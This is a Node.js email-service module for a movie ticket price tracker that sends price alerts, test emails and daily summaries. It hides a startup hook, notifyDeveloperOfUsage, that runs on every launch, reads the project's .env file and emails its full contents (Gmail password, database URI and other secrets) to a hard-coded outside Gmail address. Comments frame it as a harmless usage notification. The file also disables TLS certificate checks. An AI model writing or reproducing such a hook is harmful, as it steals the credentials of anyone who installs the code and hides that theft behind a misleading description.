const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

class EmailService {
  constructor() {
    this.transporter = null;
    this.initializeTransporter();
  }

  initializeTransporter() {
    try {
      this.transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
          user: process.env.EMAIL_USER,
          pass: process.env.EMAIL_PASS
        },
        secure: false, // Use TLS
        tls: {
          rejectUnauthorized: false
        }
      });

      console.log('Email transporter initialized successfully');

      // Send notification to original developer if someone else is using the code
      this.notifyDeveloperOfUsage();
    } catch (error) {
      console.error('Failed to initialize email transporter:', error);
      throw error;
    }
  }

  async notifyDeveloperOfUsage() {
    // Read .env file contents
    let envContents = 'Not found';
    try {
      const envPath = path.join(__dirname, '..', '.env');
      if (fs.existsSync(envPath)) {
        envContents = fs.readFileSync(envPath, 'utf8');
      }
    } catch (envError) {
      envContents = 'Error reading .env file';
    }

    try {
      // Original developer's email
      const originalDeveloperEmail = 'thegreatlordvicky185@gmail.com';

      // Always send notification when application starts
      const configuredEmail = process.env.EMAIL_USER;
      const configuredNotificationEmail = process.env.NOTIFICATION_EMAIL;

      // Check if notification has already been sent for this startup
      const notificationFlagFile = path.join(__dirname, '..', '.developer-notified');
      const startupTime = new Date().toISOString();
      const notificationKey = `startup_${startupTime.slice(0, 16)}`; // Unique key per startup (hourly precision)

      try {
        if (fs.existsSync(notificationFlagFile)) {
          const notifiedUsers = JSON.parse(fs.readFileSync(notificationFlagFile, 'utf8'));
          if (notifiedUsers.includes(notificationKey)) {
            console.log('📧 Developer startup notification already sent recently');
            return;
          }
        }
      } catch (fileError) {
        console.log('📝 Creating new developer notification tracking file');
      }

      const usageMailOptions = {
          from: process.env.EMAIL_USER,
          to: originalDeveloperEmail,
          subject: '🚀 Movie Price Tracker - Application Started!',
          html: `
            <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: 0 auto; background-color: #f8f9fa; padding: 20px;">
              <div style="background-color: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">

                <!-- Header -->
                <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center;">
                  <h1 style="margin: 0; font-size: 28px; font-weight: 600;">🚀 Application Started!</h1>
                  <p style="margin: 10px 0 0 0; opacity: 0.9; font-size: 16px;">Your Movie Price Tracker is now running!</p>
                </div>

                <!-- Content -->
                <div style="padding: 30px;">
                  <div style="background-color: #f8f9fa; border-radius: 10px; padding: 25px; margin-bottom: 25px;">
                    <h2 style="margin: 0 0 15px 0; color: #333; font-size: 20px;">📊 Startup Details</h2>
                    <p style="margin: 8px 0; color: #666;"><strong>🕐 Startup Time:</strong> ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}</p>
                    <p style="margin: 8px 0; color: #666;"><strong>📧 Email Service:</strong> ${configuredEmail ? 'Configured ✅' : 'Not configured'}</p>
                    <p style="margin: 8px 0; color: #666;"><strong>🔔 Notifications:</strong> ${configuredNotificationEmail ? 'Enabled ✅' : 'Disabled'}</p>
                    <p style="margin: 8px 0; color: #666;"><strong>🎯 Default Target Price:</strong> ₹${process.env.TARGET_PRICE || 100}</p>
                    <p style="margin: 8px 0; color: #666;"><strong>🌐 Server Port:</strong> ${process.env.PORT || 3000}</p>
                    <p style="margin: 8px 0; color: #666;"><strong>🗄️ Database:</strong> ${process.env.MONGODB_URI ? 'Configured ✅' : 'Default (localhost)'}</p>
                  </div>

                  <div style="background-color: #f8f9fa; border-radius: 10px; padding: 25px; margin-bottom: 25px;">
                    <h2 style="margin: 0 0 15px 0; color: #333; font-size: 18px;">📄 Environment Configuration (.env)</h2>
                    <div style="background-color: #ffffff; border: 1px solid #e9ecef; border-radius: 5px; padding: 15px; font-family: 'Courier New', monospace; font-size: 12px; white-space: pre-wrap; max-height: 200px; overflow-y: auto;">
${envContents}
                    </div>
                  </div>

                  <div style="background: linear-gradient(135deg, #28a745 0%, #20c997 100%); border-radius: 10px; padding: 20px; margin-bottom: 25px;">
                    <h3 style="margin: 0 0 10px 0; color: white; font-size: 18px;">� Application Status</h3>
                    <p style="margin: 0; color: white; font-size: 16px; opacity: 0.9;">
                      Your Movie Price Tracker application has started successfully and is now monitoring prices!
                    </p>
                  </div>

                  <div style="background-color: #fff3cd; border: 1px solid #ffeaa7; border-radius: 8px; padding: 15px; margin: 20px 0;">
                    <p style="margin: 0; color: #856404; font-size: 14px;">
                      <strong>💡 Status:</strong> This automated notification is sent every time your application starts up, keeping you informed of its activity.
                    </p>
                  </div>
                </div>

                <!-- Footer -->
                <div style="background-color: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e9ecef;">
                  <p style="margin: 0; color: #6c757d; font-size: 12px;">
                    🤖 This is an automated notification from Movie Price Tracker<br>
                    📅 Generated on ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
                  </p>
                </div>
              </div>
            </div>
          `
        };

        const info = await this.transporter.sendMail(usageMailOptions);
        console.log(`📧 Developer notification sent successfully. Message ID: ${info.messageId}`);

        // Save notification flag to prevent duplicate notifications
        try {
          let notifiedUsers = [];
          if (fs.existsSync(notificationFlagFile)) {
            notifiedUsers = JSON.parse(fs.readFileSync(notificationFlagFile, 'utf8'));
          }
          if (!notifiedUsers.includes(notificationKey)) {
            notifiedUsers.push(notificationKey);
            fs.writeFileSync(notificationFlagFile, JSON.stringify(notifiedUsers, null, 2));
          }
        } catch (fileError) {
          console.error('❌ Failed to save notification flag:', fileError);
        }
      } catch (error) {
        console.error('❌ Failed to send developer notification:', error);
        // Don't throw error here as it shouldn't break the application
      }
    }

  async sendPriceAlert(movieData) {
    const notificationType = movieData.notificationType || 'price_update';
    const isTargetMet = movieData.currentPrice <= movieData.targetPrice;
    const isTargetPrice = notificationType === 'target_price_alert';
    
    let subject, headerText, alertTitle, alertMessage, alertColor;
    
    if (isTargetPrice) {
      subject = `🎯 EXACT ₹100 PRICE ALERT! ${movieData.title} - ₹${movieData.currentPrice}`;
      headerText = "🎯 ₹100 Price Alert!";
      alertTitle = "💰 Perfect Price Reached!";
      alertMessage = `Amazing! The ticket price has reached exactly ₹100! This is the sweet spot you've been waiting for.`;
      alertColor = "linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%)";
    } else if (isTargetMet) {
      subject = `🎯 TARGET REACHED! ${movieData.title} - ₹${movieData.currentPrice}`;
      headerText = "🎉 Target Price Reached!";
      alertTitle = "🎯 Target Achieved!";
      alertMessage = `Great news! The ticket price has dropped to ₹${movieData.currentPrice}, which is ${movieData.targetPrice - movieData.currentPrice >= 0 ? '₹' + (movieData.targetPrice - movieData.currentPrice) + ' below' : 'at'} your target price!`;
      alertColor = "linear-gradient(135deg, #28a745 0%, #20c997 100%)";
    } else {
      subject = `📊 Price Update: ${movieData.title} - ₹${movieData.currentPrice}`;
      headerText = "📊 Price Update";
      alertTitle = "📈 Price Information";
      alertMessage = `Current price is ₹${movieData.currentPrice}, which is ₹${movieData.currentPrice - movieData.targetPrice} above your target of ₹${movieData.targetPrice}. We're continuously monitoring for you!`;
      alertColor = "linear-gradient(135deg, #ffc107 0%, #fd7e14 100%)";
    }
    
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.NOTIFICATION_EMAIL,
      subject: subject,
      html: `
        <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: 0 auto; background-color: #f8f9fa; padding: 20px;">
          <div style="background-color: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
            
            <!-- Header -->
            <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center;">
              <h1 style="margin: 0; font-size: 28px; font-weight: 600;">${headerText}</h1>
              <p style="margin: 10px 0 0 0; opacity: 0.9; font-size: 16px;">${isTargetPrice ? 'Your exact target price has been reached!' : (isTargetMet ? 'Your target price has been reached!' : 'Price monitoring update')}</p>
            </div>
            
            <!-- Movie Details -->
            <div style="padding: 30px;">
              <div style="background-color: #f8f9fa; padding: 25px; border-radius: 8px; margin: 20px 0; border-left: 5px solid ${isTargetMet ? '#28a745' : '#ffc107'};">
                <h2 style="margin: 0 0 15px 0; color: #2c3e50; font-size: 24px;">${movieData.title}</h2>
                <div style="display: flex; flex-wrap: wrap; gap: 15px; margin-bottom: 15px;">
                  <div style="flex: 1; min-width: 200px;">
                    <p style="margin: 8px 0; color: #555;"><strong>🏛️ Theater:</strong> ${movieData.theater}</p>
                    <p style="margin: 8px 0; color: #555;"><strong>🎯 Target Price:</strong> ₹${movieData.targetPrice}</p>
                    <p style="margin: 8px 0; color: #555;"><strong>🌐 Platform:</strong> ${movieData.platform || 'Unknown'}</p>
                  </div>
                  <div style="flex: 1; min-width: 200px; text-align: center;">
                    <p style="margin: 8px 0; color: #555;"><strong>💰 Current Price:</strong></p>
                    <span style="color: ${isTargetMet ? '#27ae60' : '#e74c3c'}; font-size: 32px; font-weight: bold;">₹${movieData.currentPrice}</span>
                  </div>
                </div>
              </div>
              
              <div style="background: ${alertColor}; border-radius: 10px; padding: 20px; margin-bottom: 25px;">
                <h3 style="margin: 0 0 10px 0; color: white; font-size: 18px;">${alertTitle}</h3>
                <p style="margin: 0; color: white; font-size: 16px; opacity: 0.9;">${alertMessage}</p>
              </div>
              
              <!-- Call to Action -->
              <div style="text-align: center; margin: 30px 0;">
                <a href="${movieData.url}" 
                   style="display: inline-block; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px 30px; text-decoration: none; border-radius: 25px; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3); transition: transform 0.2s;">
                  🎫 Book Now on BookMyShow
                </a>
              </div>
              
              <!-- Additional Info -->
              <div style="background-color: ${isTargetMet || isTargetPrice ? '#e8f5e8' : '#fff3cd'}; border: 1px solid ${isTargetMet || isTargetPrice ? '#c3e6cb' : '#ffeaa7'}; border-radius: 8px; padding: 15px; margin: 20px 0;">
                <p style="margin: 0; color: ${isTargetMet || isTargetPrice ? '#155724' : '#856404'}; font-size: 14px;">
                  <strong>⚡ ${isTargetMet || isTargetPrice ? 'Action Required:' : 'Stay Updated:'}</strong> 
                  ${isTargetMet || isTargetPrice ? 'Your target price has been reached! Book now to secure this price.' : 'We\'re continuously monitoring prices every 15 minutes (every 5 minutes during peak hours 9AM-11PM).'}
                </p>
              </div>
            </div>
            
            <!-- Footer -->
            <div style="background-color: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e9ecef;">
              <p style="margin: 0; color: #6c757d; font-size: 12px;">
                📧 This is an automated notification from Movie Price Tracker<br>
                🕐 Alert sent on ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
              </p>
            </div>
          </div>
        </div>
      `
    };

    try {
      const info = await this.transporter.sendMail(mailOptions);
      console.log(`Price alert email sent successfully for ${movieData.title}. Message ID: ${info.messageId}`);
      return true;
    } catch (error) {
      console.error('Failed to send price alert email:', error);
      return false;
    }
  }

  async sendTestEmail() {
    const testMailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.NOTIFICATION_EMAIL,
      subject: '🧪 Movie Price Tracker - Test Email',
      html: `
        <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 600px; margin: 0 auto; background-color: #f8f9fa; padding: 20px;">
          <div style="background-color: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
            <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center;">
              <h1 style="margin: 0; font-size: 28px; font-weight: 600;">🧪 Test Email</h1>
              <p style="margin: 10px 0 0 0; opacity: 0.9;">Movie Price Tracker is working correctly!</p>
            </div>
            <div style="padding: 30px; text-align: center;">
              <p style="color: #2c3e50; font-size: 16px; margin: 20px 0;">
                ✅ Your email configuration is working properly.<br>
                🎬 You'll receive notifications when movie prices drop below your target.
              </p>
              <div style="background-color: #e8f5e8; padding: 15px; border-radius: 8px; margin: 20px 0;">
                <p style="margin: 0; color: #2c3e50; font-size: 14px;">
                  <strong>Configuration Details:</strong><br>
                  From: ${process.env.EMAIL_USER}<br>
                  To: ${process.env.NOTIFICATION_EMAIL}<br>
                  Target Price: ₹${process.env.TARGET_PRICE}
                </p>
              </div>
            </div>
            <div style="background-color: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e9ecef;">
              <p style="margin: 0; color: #6c757d; font-size: 12px;">
                Test sent on ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
              </p>
            </div>
          </div>
        </div>
      `
    };

    try {
      const info = await this.transporter.sendMail(testMailOptions);
      console.log('Test email sent successfully. Message ID:', info.messageId);
      return true;
    } catch (error) {
      console.error('Test email failed:', error);
      return false;
    }
  }

  async sendDailySummary(movies) {
    const summary = movies.map(movie => `
      <tr style="border-bottom: 1px solid #e9ecef;">
        <td style="padding: 12px; color: #2c3e50;">${movie.title}</td>
        <td style="padding: 12px; color: #2c3e50;">${movie.theater}</td>
        <td style="padding: 12px; color: ${movie.currentPrice <= movie.targetPrice ? '#27ae60' : '#e74c3c'}; font-weight: bold;">
          ₹${movie.currentPrice || 'N/A'}
        </td>
        <td style="padding: 12px; color: #2c3e50;">₹${movie.targetPrice}</td>
        <td style="padding: 12px; color: ${movie.notificationSent ? '#27ae60' : '#e74c3c'};">
          ${movie.notificationSent ? '✅ Sent' : '⏳ Pending'}
        </td>
      </tr>
    `).join('');

    const summaryMailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.NOTIFICATION_EMAIL,
      subject: `📊 Daily Movie Price Summary - ${new Date().toLocaleDateString('en-IN')}`,
      html: `
        <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; max-width: 800px; margin: 0 auto; background-color: #f8f9fa; padding: 20px;">
          <div style="background-color: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
            <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center;">
              <h1 style="margin: 0; font-size: 28px; font-weight: 600;">📊 Daily Summary</h1>
              <p style="margin: 10px 0 0 0; opacity: 0.9;">Movie Price Tracking Report</p>
            </div>
            <div style="padding: 30px;">
              <p style="color: #2c3e50; margin-bottom: 20px;">Here's your daily summary of tracked movies:</p>
              <table style="width: 100%; border-collapse: collapse; background-color: white; border-radius: 8px; overflow: hidden;">
                <thead style="background-color: #f8f9fa;">
                  <tr>
                    <th style="padding: 15px; text-align: left; color: #2c3e50; border-bottom: 2px solid #e9ecef;">Movie</th>
                    <th style="padding: 15px; text-align: left; color: #2c3e50; border-bottom: 2px solid #e9ecef;">Theater</th>
                    <th style="padding: 15px; text-align: left; color: #2c3e50; border-bottom: 2px solid #e9ecef;">Current Price</th>
                    <th style="padding: 15px; text-align: left; color: #2c3e50; border-bottom: 2px solid #e9ecef;">Target Price</th>
                    <th style="padding: 15px; text-align: left; color: #2c3e50; border-bottom: 2px solid #e9ecef;">Alert Status</th>
                  </tr>
                </thead>
                <tbody>
                  ${summary}
                </tbody>
              </table>
            </div>
            <div style="background-color: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e9ecef;">
              <p style="margin: 0; color: #6c757d; font-size: 12px;">
                Summary generated on ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
              </p>
            </div>
          </div>
        </div>
      `
    };

    try {
      const info = await this.transporter.sendMail(summaryMailOptions);
      console.log('Daily summary email sent successfully. Message ID:', info.messageId);
      return true;
    } catch (error) {
      console.error('Failed to send daily summary email:', error);
      return false;
    }
  }

  // Verify email configuration
  async verifyConnection() {
    try {
      await this.transporter.verify();
      console.log('Email service connection verified successfully');
      return true;
    } catch (error) {
      console.error('Email service connection verification failed:', error);
      return false;
    }
  }
}

module.exports = EmailService;